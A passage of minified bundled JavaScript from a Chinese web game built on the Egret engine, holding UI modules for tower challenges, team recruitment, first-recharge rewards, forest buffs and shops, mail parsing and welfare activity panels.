eui.ArrayCollection(t),this.nameLabel.text=f.SkyLevelModel.ins().stageLevel+"重天";var i=f.SkyLevelModel.ins(),n=i.getNextOpenLevel();if(n){var o=gettext("{0}重天{1}层",n.group,n.layer),a=gettext("通关{0}",o),h="";if(n.equipPos)h=gettext("第{0}个图腾槽",n.equipPos),this.unlock.text=gettext("开启图腾槽"),this.itemicon.runeName=h,this.itemicon.desc2=""+o,this.itemicon.data=n.showIcon;else{this.itemicon.desc=gettext("通关{0}解锁",o),this.itemicon.data=n.showIcon;var u=s.GlobalConfig.ItemConfig[n.showIcon],p=l.ItemUtil.getQuality2(u),c=gettext("解锁新类型");p==e.RunType&&(c=gettext("获得")),this.unlock.text=c}this.openDesc.text=a}else this.topGroup.visible=!1,this.buttomGroup.verticalCenter=0;var g=s.GlobalConfig.FbChallengeConfig[i.cruLevel];if(g){var m="",v=g.zsLevelLimit;v&&(m=v?gettext("{0}转",v):""),this.limit.text=gettext("{0}{1}级可继续挑战",m,g.levelLimit),this.iconList.dataProvider=new eui.ArrayCollection(g.reward),this.expText.text=g.reward[2]?""+g.reward[2].count:"";var y=r.ActorCC.level>=g.levelLimit&&d.ZsCT.ins().stage>=g.zsLevelLimit;this.limit.visible=!y,this.challengeBtn.visible=y;s.GlobalConfig.MonstersConfig[g.bossId];this.eLevel.text=g.group+"重天"+g.layer+"层"}},e.prototype.updateRedPoint=function(){this.updateTowerState()},e.prototype.updateTowerState=function(){var t=!0;0!=f.SkyLevelModel.ins().cruLevel&&f.SkyLevelModel.ins().cruLevel-1<s.GlobalConfig.FbChallengeBaseConfig.LotteryOpenLevel&&(t=!1),this.dailyGift0.visible=t,this.choujiang.visible=t},e.prototype.challenge=function(){f.SkyLevelModel.ins().go()},e.prototype.getDayRewward=function(){return f.SkyLevelModel.ins().cruLevel<=1?void p.TipsCT.ins().showTips(gettext("通关一层后，明日0点可领取每日奖励，通关层数越高，奖励越好")):f.SkyLevelModel.ins().dayReward<1?void p.TipsCT.ins().showTips(gettext("今天没有奖励可以领取")):2==f.SkyLevelModel.ins().dayReward?void p.TipsCT.ins().showTips(gettext("明日0点可领取每日奖励，通关层数越高，奖励越好")):void win.open("ChallengeDayRewardWin")},e.prototype.onClick=function(t){switch(t.currentTarget){case this.jump:this.rankModel&&win.open("FBChallengeRankWin",this.rankModel);break;case this.btnC:win.close(this)}},e.prototype.showRewwardLabel=function(){var t="";1==f.SkyLevelModel.ins().dayReward?(t=gettext("可领取"),this.challengeBtn0.eRp.visible=!0):(t=gettext("明日0点可领取"),this.challengeBtn0.eRp.visible=!1),this.dailyGift.text=t},e.prototype.tabRp=function(){return!1},Object.defineProperty(e.prototype,"winTitle",{get:function(){return"tongtianta_b1"},enumerable:!1,configurable:!0}),e.openCheck=function(){var t=s.GlobalConfig.FbChallengeConfig[1];return r.ActorCC.level<t.levelLimit?(p.TipsCT.ins().showTips(gettext("{0}级可挑战",t.levelLimit)),!1):!0},e.RunType=3,e}(o.BaseView);e.FBChallengePanel=m,window.FBChallengePanel=m,__reflect(m.prototype,"FBChallengePanel",[]),window.FBChallengePanel=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamCityItem1=void 0;var n=i(3),o=i(0),s=i(43),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.goBtn,this.onClick)},e.prototype.dataChanged=function(){this.tempName.text=this.data.name+gettext("的队伍"),this.lvLab.text=this.data.count+("/"+o.GlobalConfig.RoleBaseConfig.teamActorMaxNum),this.goBtn.label=-1!=this.data.applylist.indexOf(this.data.id)?gettext("已申请"):gettext("申请加入"),this.goBtn.enabled=!s.CityCC.ins().teamId&&-1==this.data.applylist.indexOf(this.data.id)},e.prototype.onClick=function(t){s.CityCC.ins().sendTeamChange(3,this.data.id),this.data.applylist.push(this.data.id),this.goBtn.enabled=!1,this.goBtn.label=gettext("已申请")},e}(n.BaseItemRender);e.TeamCityItem1=a,window.TeamCityItem1=a,__reflect(a.prototype,"TeamCityItem1",[]),window.TeamCityItem1=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamCityItem2=void 0;var n=i(3),o=i(0),s=i(4),a=i(48),r=i(43),l=i(44),h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.checkBtn,this.onClick),this.addTouchEvent(this.goBtn,this.onClick)},e.prototype.dataChanged=function(){var t;this.mapName.text=(null===(t=o.GlobalConfig.InstanceConfig[this.data.fbId])||void 0===t?void 0:t.name)||"",this.playName.text=this.data.name,this.lvLab.text="Lv."+this.data.lv,this.jobLab.text=a.Role.getJobNameByJob(this.data.job),this.goBtn.enabled=r.CityCC.ins().leaderId==s.ActorCC.actorID&&this.data.actId!=s.ActorCC.actorID},e.prototype.onClick=function(t){switch(t.currentTarget){case this.checkBtn:l.ReadPlayerCT.ins().sendFindPlayer(this.data.actId);break;case this.goBtn:r.CityCC.ins().sendTeamChange(5,this.data.actId)}},e}(n.BaseItemRender);e.TeamCityItem2=h,window.TeamCityItem2=h,__reflect(h.prototype,"TeamCityItem2",[]),window.TeamCityItem2=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamCityItem3=void 0;var n=i(3),o=i(48),s=i(43),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.noBtn,this.onClick),this.addTouchEvent(this.yesBtn,this.onClick)},e.prototype.dataChanged=function(){this.playerName.text=this.data.name,this.jobLab.text=o.Role.getJobNameByJob(this.data.job),this.lvLab.text="Lv."+this.data.lv},e.prototype.onClick=function(t){switch(t.currentTarget){case this.noBtn:s.CityCC.ins().sendTeamChange(4,0);break;case this.yesBtn:s.CityCC.ins().sendTeamChange(4,1,this.data.actId)}this.changeList(this.data.actId),s.CityCC.ins().postChangeApplyList()},e.prototype.changeList=function(t){for(var e=s.CityCC.ins().teamApplyList.length,i=0;e>i;i++)if(s.CityCC.ins().teamApplyList[i].actId==t){s.CityCC.ins().teamApplyList.splice(i,1);break}},e}(n.BaseItemRender);e.TeamCityItem3=a,window.TeamCityItem3=a,__reflect(a.prototype,"TeamCityItem3",[]),window.TeamCityItem3=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbGuideItemrender=void 0;var n=i(3),o=i(5),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbGuideItem",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.monHeadImg.source=t.monHead,this.nameTxt.text=t.monName,this.dangerLvTxt.textFlow=o.TextFlowMaker.generateTextFlow(t.dangerLv),this.guideTxt.textFlow=o.TextFlowMaker.generateTextFlow(t.guideText)},e}(n.BaseItemRender);e.TeamFbGuideItemrender=s,window.TeamFbGuideItemrender=s,__reflect(s.prototype,"TeamFbGuideItemrender",[]),window.TeamFbGuideItemrender=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbItem=void 0;var n=i(3),o=i(32),s=i(49),a=i(21),r=function(t){function e(e,i){var n=t.call(this)||this;return n._sn_="teamfbitemskin",n.isNormal=!0,n.cfg=e,n.isNormal=i,n}return __extends(e,t),e.prototype.skinComplete=function(){this.x=this.cfg.showPos[0],this.y=this.cfg.showPos[1],this.touchChildren=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.update()},e.prototype.update=function(){if(this.skin&&this.eRp){this.eTitle.source=this.cfg.nameImg;var t,e=!1;if(this.isNormal?(t=this.cfg.id==o.FbCT.ins().tfPassID+1,e=this.cfg.id<=o.FbCT.ins().tfPassID+1):(t=this.cfg.id==o.FbCT.ins().tfPurgatoryPassID+1,e=this.cfg.id<=o.FbCT.ins().tfPurgatoryPassID+1),this.eRp.visible=t,this.eG.filters=e?null:s.FilterUtil.ARRAY_GRAY_FILTER,this.icon.source=this.cfg.Img,this.isNormal)this.bgImg.visible=!0;else{this.bgImg.visible=!1;var i=new a.MovieClip;this.effGrop.addChild(i),i.playFile(RES_DIR_EFF+"lianyu",-1)}}},e}(n.BaseItemRender);e.TeamFbItem=r,window.TeamFbItem=r,__reflect(r.prototype,"TeamFbItem",[]),window.TeamFbItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AssistantHeadItemRender=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.Name.text=this.data.vo.roleName,this.imgHead.source="yuanhead"+this.data.vo.job+"1"},e}(n.BaseItemRender);e.AssistantHeadItemRender=o,window.AssistantHeadItemRender=o,__reflect(o.prototype,"AssistantHeadItemRender",[]),window.AssistantHeadItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BtnFirstCharge=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BtnFirstChargeSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.removeDisplay=function(){},e.prototype.dataChanged=function(){var t=this.data;this.labelDisplay.text=String(t.id),this.eRp.visible=t.red},e}(n.BaseItemRender);e.BtnFirstCharge=o,window.BtnFirstCharge=o,__reflect(o.prototype,"BtnFirstCharge",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FirstChargeNew=void 0;var n=i(1),o=i(0),s=i(4),a=i(25),r=i(390),l=i(392),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FirstChargeNewSkin",e.configArr=[],e.hasRechar=!0,e.tabData=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.arc_tab=new eui.ArrayCollection,this.tabBtn.dataProvider=this.arc_tab,this.tabBtn.itemRenderer=r.BtnFirstCharge,this.tabBtn.addEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.tabBtn.selectedIndex=0;for(var t=Object.keys(o.GlobalConfig.RechargeBigGiftBagConfig),e=0,i=t;e<i.length;e++){var n=i[e];this.configArr.push(Number(n)),this.tabData.push({id:Number(n),red:!1})}this.arc_tab.replaceAll(this.tabData.concat()),this.list_reward.itemRenderer=l.FirstCharge_reward,this.list_reward.dataProvider=this.arc_reward=new eui.ArrayCollection,this.addTouchEvent(this.btn_ChongZhi,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateCurTab(),observe(this,this.updateCurTab,a.Recharge.ins().getRecharge1WinInfo)},e.prototype.removeDisplay=function(){},e.prototype.CHANGE=function(t){this.updateCurTab()},e.prototype.updateCurTab=function(){var t=this.tabBtn.selectedIndex,e=this.configArr[t],i=o.GlobalConfig.RechargeBigGiftBagConfig[e];this.img_title.source=i[1].titleImg;for(var n in this.tabData){var r=a.Recharge.ins().recharge1WinInfoDic[this.tabData[n].id];this.tabData[n].red=!1;for(var h in r)if(1==r[h].type){this.tabData[n].red=!0;break}}this.arc_tab.replaceAll(this.tabData.concat()),this.lb_ChongZhi.text=a.Recharge.ins().recharge1WinNum+"";var u=a.Recharge.ins().recharge1WinInfoDic[e];this.btnstate={day:0,state:0,index:0};for(var p=!0,d=[],c=1;c<u.length;c++){var f=u[c].day;1==u[c].type&&(this.btnstate.day=f,this.btnstate.state=1,this.btnstate.index=e),2!=u[c].type&&(p=!1);var g=new l.FirstCharge_rewardVo;g.rewardArr=i[f]["award_"+s.ActorCC.jobId],g.hasGet=2==u[c].type,d.push(g)}return this.arc_reward.replaceAll(d),1==this.btnstate.state?(this.btn_ChongZhi.visible=!0,this.btn_ChongZhi.sRp=!0,this.btn_ChongZhi.icon="firstcharge_btn_3",void(this.lb_hasGet.text="")):(this.btn_ChongZhi.sRp=!1,a.Recharge.ins().recharge1WinNum<i[1].index?(this.hasRechar=!1,this.btn_ChongZhi.visible=!0,this.btn_ChongZhi.icon="firstcharge_btn_2",void(this.lb_hasGet.text="")):(this.hasRechar=!0,this.btn_ChongZhi.visible=!1,void(p?this.lb_hasGet.text=gettext("已领取"):this.lb_hasGet.text=gettext("明天可领取"))))},e.prototype.onClick=function(t){t.target==this.btn_ChongZhi&&(1==this.btnstate.state?a.Recharge.ins().sendNewRecycle(this.btnstate.index,this.btnstate.day):win.open("RechargeShowWin"))},e}(n.BaseView);e.FirstChargeNew=h,window.FirstChargeNew=h,__reflect(h.prototype,"FirstChargeNew",[]),window.FirstChargeNew=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FirstCharge_rewardVo=e.FirstCharge_reward=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FirstCharge_rewardSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.removeDisplay=function(){},e.prototype.dataChanged=function(){for(var t=this.data,e=0;e<t.rewardArr.length;e++)this["item"+(e+1)].data=t.rewardArr[e];this.img_hasGet.visible=t.hasGet},e}(n.BaseItemRender);e.FirstCharge_reward=o,window.FirstCharge_reward=o,__reflect(o.prototype,"FirstCharge_reward",[]);var s=function(){function t(){}return t}();e.FirstCharge_rewardVo=s,window.FirstCharge_rewardVo=s,__reflect(s.prototype,"FirstCharge_rewardVo",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestBuffChoiceItem=void 0;var n=i(5),o=i(3),s=i(0),a=i(10),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTouch)},e.prototype.dataChanged=function(){var t=this.data,e=s.GlobalConfig.YoumingForestBuffConfig[t[0]];switch(this.txt_name.text=e.title,this.txt_name0.textFlow=n.TextFlowMaker.generateTextFlow(e.desc),e.quality){case 1:this.imgBg.source="forest_card_green";break;case 2:this.imgBg.source="forest_card_blue";break;case 3:this.imgBg.source="forest_card_purple";break;case 4:this.imgBg.source="forest_card_orange";break;case 5:this.imgBg.source="forest_card_red"}this.txt_name.textColor=a.ItemUtil.getQualityColor(e.quality)},e.prototype.onTouch=function(t){},e.prototype.setSelect=function(t){var e=this,i=t?1.1:1;egret.Tween.removeTweens(this.grScale);var n=egret.Tween.get(this.grScale);n.to({scaleX:i,scaleY:i},150).wait(0).call(function(){egret.Tween.removeTweens(e.grScale)})},e}(o.BaseItemRender);e.ForestBuffChoiceItem=r,window.ForestBuffChoiceItem=r,__reflect(r.prototype,"ForestBuffChoiceItem",[]),window.ForestBuffChoiceItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestBuffWin=void 0;var n=i(1),o=i(54),s=i(87),a=i(395),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layoutNum=LayoutNum.top,e._sn_="ForestBuffList",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.ForestBuffItem,this.eList.dataProvider=this.eArc=new eui.ArrayCollection,observe(this,this.update,o.Fb2CT.ins().postForestBuff),this.addTouchEvent(this,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];s.ForestModel.ins().buffList=[],o.Fb2CT.ins().sendForestBuff()},e.prototype.update=function(){var t=s.ForestModel.ins().buffList;this.eArc.source=t,0==t.length?this.labNotHave.visible=!0:this.labNotHave.visible=!1},e.prototype.onTouch=function(t){t.target},e}(n.BaseView);e.ForestBuffWin=r,window.ForestBuffWin=r,__reflect(r.prototype,"ForestBuffWin",[]),window.ForestBuffWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestBuffItem=void 0;var n=i(5),o=i(3),s=i(0),a=i(10),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data,e=s.GlobalConfig.YoumingForestBuffConfig[t];this.txt_rank.text=e.title+"",this.txt_rank.textColor=a.ItemUtil.getQualityColor(e.quality),this.txt_desc.textFlow=n.TextFlowMaker.generateTextFlow(e.desc+"")},e}(o.BaseItemRender);e.ForestBuffItem=r,window.ForestBuffItem=r,__reflect(r.prototype,"ForestBuffItem",[]),window.ForestBuffItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestStoreItems=void 0;var n=i(19),o=i(3),s=i(0),a=i(54),r=i(87),l=i(2),h=function(t){function e(){var e=t.call(this)||this;return e.itemId=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.dataChanged=function(){var t=this.data[0],e=s.GlobalConfig.YoumingForestRraderEventConfig[t.eventId];this.itemIcon.data=e.award[t.eventList[this.itemIndex]-1],this.itemId=this.itemIcon.data.id,this.money.setData(e.cost[t.eventList[this.itemIndex]-1]),this.eBuy.visible=this.data[1]?!0:!1,this.upData()},e.prototype.upData=function(){var t=this.data[0],e=s.GlobalConfig.YoumingForestRraderEventConfig[t.eventId],i=r.ForestModel.ins().getBuyData(t.location);this.exbuy.visible=!1,t.location==r.ForestModel.ins().forestLocation?this.eBuy.visible=!0:this.eBuy.visible=!1;for(var n=0;n<i.length;n++){var o=i[n];if(e.award[o.buy-1].id==this.itemId)return this.exbuy.visible=!0,void(this.eBuy.visible=!1)}},e.prototype.onClick=function(t){switch(t.target){case this.eBuy:var e=this.data[0],i=s.GlobalConfig.YoumingForestRraderEventConfig[e.eventId],o=i.cost[e.eventList[this.itemIndex]-1].id,r=n.GlobalFun.getItemCount(o);r?a.Fb2CT.ins().sendForestEvent(e.eventList[this.itemIndex]):l.TipsCT.ins().showTips(gettext("消耗货币不足")),win.close(this)}},e}(o.BaseItemRender);e.ForestStoreItems=h,window.ForestStoreItems=h,__reflect(h.prototype,"ForestStoreItems",[]),window.ForestStoreItems=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestEventView=void 0;var n=i(1),o=i(0),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="ForestEventIcon",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.anchorOffsetX=this.width/2,this.anchorOffsetY=this.height/2},e.prototype.addDisplay=function(){var t=o.GlobalConfig.YoumingForestEventConfig;this.icon_event.source=t[this.vo.eventId].eventIcon},e.prototype.setData=function(t){this.vo=t},Object.defineProperty(e.prototype,"dataVo",{get:function(){return this.vo},enumerable:!1,configurable:!0}),e.prototype.onClick=function(t){t.target},e}(n.BaseView);e.ForestEventView=s,window.ForestEventView=s,__reflect(s.prototype,"ForestEventView",[]),window.ForestEventView=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestPropItemRender=void 0;var n=i(49),o=i(3),s=i(6),a=i(87),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="TreasureChuanshiItem",e.touchChildren=!1,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data,e=s.BagCT.ins().getBagItemById(t.id);e?(this.gift.data=e,this.gift.filters=null):(this.gift.data=t.id,this.gift.filters=n.FilterUtil.ARRAY_GRAY_FILTER),this.gift.showNum(!0),this.select.visible=this.select2.visible=!1;var i=a.ForestModel.ins().curSelecteIndex;i==this.itemIndex&&this.checkSelcted(this.itemIndex)},e.prototype.checkSelcted=function(t){this.select.visible=this.select2.visible=this.itemIndex==t
},e}(o.BaseItemRender);e.ForestPropItemRender=r,window.ForestPropItemRender=r,__reflect(r.prototype,"ForestPropItemRender",[]),window.ForestPropItemRender=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestRankItemRenderer=void 0;var n=i(3),o=i(11),s=i(0),a=i(71),r=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!0,e.touchChildren=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=o.ItemBase,this.eList.dataProvider=this.eArc=new eui.ArrayCollection},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.txt_rank.visible=!0,this.txt_rank.text=this.data.pos,this.txt_name.text=t.player,this.txt_starNum.text=this.data.star+gettext("星");var e=s.GlobalConfig.YoumingForestRankConfig,i=e[this.data.pos];this.eArc.source=i.award;var n="";switch(this.data.RankType){case a.RankDataType.TYPE_POWER:n=""+this.data.power;break;case a.RankDataType.TYPE_LEVEL:n=gettext("{0}转{1}级",this.data.zhuan,this.data.level)}}this.visible=null!=this.data},e}(n.BaseItemRender);e.ForestRankItemRenderer=r,window.ForestRankItemRenderer=r,__reflect(r.prototype,"ForestRankItemRenderer",[]),window.ForestRankItemRenderer=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MailData=void 0;var n=i(30),o=i(8),s=i(0),a=i(58),r=function(){function t(){}return t.prototype.parser=function(t){this.disposeData(t),this.item=[],this.text=t.readString(),this.paramStr=t.readString();for(var e=t.readInt(),i=0;e>i;i++){var o=new n.RewardData;o.parser(t);var s=t.readByte();s&&(o.qx=s),this.item.push(o)}this.text=a.LangUtils.analysis(this.text,this.paramStr)},t.prototype.disposeData=function(t){this.handle=t.readDouble(),this.title=t.readString();var e=s.GlobalConfig.LanguageConfig[this.title];this.title=e?e.content:this.title,this.times=o.DateUtils.formatMiniDateTime(t.readInt())/1e3,this.type=t.readInt(),this.receive=t.readInt()},t}();e.MailData=r,window.MailData=r,__reflect(r.prototype,"MailData",[]),window.MailData=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FacebookWindow=void 0;var n=i(1),o=i(77),s=i(15),a=i(12),r=i(2),l=i(84),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FacebookSkin",e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=a.OpenSystem.ins().checkSysOpen(s.SystemType.FaceBook);return i||r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(s.SystemType.FaceBook)),i},e.prototype.skinComplete=function(){this.eList.itemRenderer=o.ItemBaseNoName,this.addTouchEvent(this.btnGet,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(this.curCfg=l.FuLiCT.ins().getFaceBookCfg(),this.curCfg){this.btnGet.visible=!!this.curCfg.link;var i=this.curCfg.reward.concat([]);this.eList.dataProvider=new eui.ArrayCollection(i)}},e.prototype.onClick=function(t){this.curCfg&&platform.reportOpenUrl(this.curCfg.link+"?random="+(new Date).getTime())},e}(n.BaseView);e.FacebookWindow=h,window.FacebookWindow=h,__reflect(h.prototype,"FacebookWindow",[]),window.FacebookWindow=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliActivityMain=void 0;var n=i(1),o=i(17),s=i(0),a=i(57),r=i(9),l=i(29),h=i(403),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliActivityMainSkin",e.pageStyle=a.ActOnPlace.HuoDong,e.winStr="",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.winStr="",t[0]&&(this.winStr=t[0]),this.initTab(),observe(this,this.updateTabRp,o.RedPointBaseSys.ins().RpChange),this.updateTabRp()},e.prototype.updateTabRp=function(){this.eTab.updateReds()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=r.Activity.ins().activityData,e=Object.keys(t);if(!e.length)return!1;var i=[];for(var n in t){var o=t[n];if(this.pageStyle==o.pageStyle){if(!o.isOpenActivity()||o.getHide())continue;var a=l.ActivityPanel.create(o.id,o.type);if(!a)continue;a.name=s.GlobalConfig.ActivityBtnConfig[o.id].title||"",a.visible=!1,a.horizontalCenter="0",a.top="0",a.bottom="0",i.push(a)}}i.sort(function(t,e){var i=s.GlobalConfig.ActivityBtnConfig[t.activityID].sort,n=s.GlobalConfig.ActivityBtnConfig[e.activityID].sort;return i>n?1:n>i?-1:0});for(var h=0;h<i.length;h++)this.eVs.addChild(i[h]);this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.initSelected=function(){if(this.winStr&&""!=this.winStr){var t=this.eVs.numElements;if(t>0)for(var e=0;t>e;e++){var i=this.eVs.getElementAt(e);if(this.getClassName(i)==this.winStr)return e}}return 0},e.prototype.getClassName=function(t){return t instanceof h.OSATarget38Panel?"OSATarget38Panel":"Unknown"},e.prototype.tabRp=function(){var t;if(window.platform.isshen())return!1;var e=r.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(this.pageStyle==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(n.BaseView);e.FuliActivityMain=u,window.FuliActivityMain=u,__reflect(u.prototype,"FuliActivityMain",[]),window.FuliActivityMain=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget38Panel=void 0;var n=i(8),o=i(1),s=i(0),a=i(197),r=i(7),l=i(9),h=i(240),u=function(t){function e(e){var i=t.call(this)||this;return i._sn_="NewhongbaoSkin",i.activityID=e,i.addTouchEvent(i,i.onThouch),i}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.waitTime.text="",observe(this,this.update,l.Activity.ins().postHongBaoOpen,l.Activity.ins().postChangePage,l.Activity.ins().postDownHongBao),this.update()},e.prototype.update=function(){this.getGroup.visible=this.showGroup.visible=!1,h.ActivityType38Data.HasHongBao?this.getGroup.visible=!0:(this.showGroup.visible=!0,this.upDateView())},e.prototype.removeDisplay=function(){},e.prototype.onThouch=function(t){switch(t.target){case this.getRewrodBtn:this.data&&this.data.currVipTotal>0&&this.data.hasRecharge?l.Activity.ins().sendGetHongBao(2,this.activityID):this.data&&!this.data.hasRecharge&&win.open(a.RechargeShowWin);break;case this.getBtn:l.Activity.ins().sendGetHongBao(1,l.Activity.ins().activityId)}},e.prototype.upDateView=function(){var t;if(this.data=l.Activity.ins().activityData[this.activityID],this.data){if(this.eNoVIPShowGroup.visible=!(this.data.hasRecharge&&this.data.currVipTotal<=0),this.eCurrGetMoneyLab.text=gettext("{0}元宝",this.data.currGet),this.eVIPGetMoneyLab.text=gettext("{0}元宝",this.data.currVipTotal),this.desc.text="",this.getRewrodBtn.visible=this.data.currVipTotal>0,this.data.currentNum>=0){this.desc.height=0;for(var e=this.data.currentNum>50?this.data.currentNum-50:0,i=this.data.currentNum-1;i>=e;i--)this.desc.text+=gettext("{0}获得了{1}元宝",this.data.currData[i].name,this.data.currData[i].count)+"\n",this.desc.height+=20}var o=(null===(t=s.GlobalConfig.ActivityType38Config[this.activityID])||void 0===t?void 0:t.ordinaryCount)||5;this.robTimes.text=o-this.data.robTimes+"",this.timeTxt.visible=!(o-this.data.robTimes<=0),Timer.stop(this.updateTime,this),this.giftPackTime=(n.DateUtils.formatMiniDateTime(this.data.hongbaoEndTime)-r.GameServerCC.serverTime)/1e3,this.updateTime(),Timer.start(1e3,0,this.updateTime,this)}},e.prototype.updateTime=function(){return this.waitTime.text=n.DateUtils.getFormatBySecond(this.giftPackTime,n.DateUtils.TIME_FORMAT_10),this.giftPackTime<=0?(this.timeTxt.visible=!1,this.waitTime.text="",void Timer.stop(this.updateTime,this)):void(this.giftPackTime=(n.DateUtils.formatMiniDateTime(this.data.hongbaoEndTime)-r.GameServerCC.serverTime)/1e3)},e}(o.BaseView);e.OSATarget38Panel=u,window.OSATarget38Panel=u,__reflect(u.prototype,"OSATarget38Panel",[]),window.OSATarget38Panel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliMain2=void 0;var n=i(1),o=i(17),s=i(198),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliMain2Skin",e}return __extends(e,t),e.prototype.addDisplay=function(t){observe(this,this.updateTabRp,o.RedPointBaseSys.ins().RpChange),this.initTab()},e.prototype.initTab=function(){},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.tabRp=function(){return s.DailyCheckIn.ins().rp.v},e}(n.BaseView);e.FuliMain2=a,window.FuliMain2=a,__reflect(a.prototype,"FuliMain2",[]),window.FuliMain2=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliMain3=void 0;var n=i(1),o=i(0),s=i(9),a=i(56),r=i(29),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliMain3Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.updateTabRp,s.Activity.ins().postChangePage,s.Activity.ins().postRewardResult)},e.prototype.addDisplay=function(t){this.initTab()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=s.Activity.ins().activityData,e=Object.keys(t);if(!e.length)return!1;var i=[];for(var n in t){var l=t[n];if(a.Activity3PageStyle.Activity2==l.pageStyle){if(!l.isOpenActivity()||l.getHide())continue;var h=r.ActivityPanel.create(l.id,l.type);if(!h)continue;h.name=o.GlobalConfig.ActivityBtnConfig[l.id].title||"",h.visible=!1,h.horizontalCenter="0",h.top="0",h.bottom="0",i.push(h)}}i.sort(function(t,e){var 